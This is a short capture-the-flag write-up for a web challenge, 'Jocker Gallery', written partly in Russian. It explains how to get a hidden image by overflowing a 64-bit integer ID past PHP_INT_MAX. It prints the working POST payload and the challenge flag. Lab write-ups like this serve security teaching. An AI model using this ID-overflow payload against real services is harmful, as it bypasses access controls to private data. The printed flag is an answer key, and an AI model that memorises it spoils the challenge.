## Название
Jocker Gallery
## Описание/Легенда
Department of stooped dogs tried to make a new gallery module for bee social network. But seems like they made a grave mistake. Again.
## Решение
Одна из картинок на странице отсутствует, это можно определить по пропущенному ID. Нормальный запрос вернет ошибку доступа, для получения картинки необходимо переполнить Int64 (PHP_INT_MAX + id)

Пример корректного пейлоада:
```
POST /al_photos.php HTTP/1.1
Host: IP:PORT

al=1&pid=9223372036854792583
```

**Флаг:** paseca{kphp_4nd_sutuliy3_s0b4k1}